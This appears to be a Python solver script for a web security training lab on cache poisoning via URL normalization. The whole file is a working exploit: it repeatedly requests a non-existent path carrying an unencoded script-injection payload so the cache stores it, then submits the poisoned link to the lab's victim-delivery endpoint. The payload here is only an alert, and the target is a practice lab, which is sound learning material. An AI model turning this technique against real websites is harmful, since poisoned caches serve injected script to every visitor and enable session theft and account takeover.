import requests
import urllib.request
from colorama import Fore

LAB_NAME = "Web cache poisoning via URL normalization"

def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Send multiple request to a non-exist path to cache it with the injected payload\n2. Deliver the link to the victim\n""")

    url = url.rstrip('/')
    non_exist = "mystic_mido"
    injected_path = f"/{non_exist}</p><script>alert(1)</script><p>"

    print(Fore.WHITE + "⦗1⦘ Poisoning a non-existent path with the injected payload...")

    for counter in range(1, 21):
        print(Fore.WHITE + f"    → Attempt {counter}/20", end='\r', flush=True)
        try:
            # key point: urllib does NOT encode the payload
            urllib.request.urlopen(f"{url}{injected_path}")
        except:
            continue

    print(Fore.GREEN + "\n🗹 Path is poisoned successfully")

    print(Fore.WHITE + "⦗2⦘ Delivering link to victim... ", end="", flush=True)
    data = {"answer": f"{url}{injected_path}"}
    try:
        requests.post(f"{url}/deliver-to-victim", data=data, allow_redirects=False, verify=False)
        print(Fore.GREEN + "OK")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to deliver: {e}")
        return False

    print(Fore.GREEN + "🗹 Delivered. Wait 30 seconds and refresh the lab page.")
    print(Fore.GREEN + "🗹 Lab should be marked as solved.")
    return True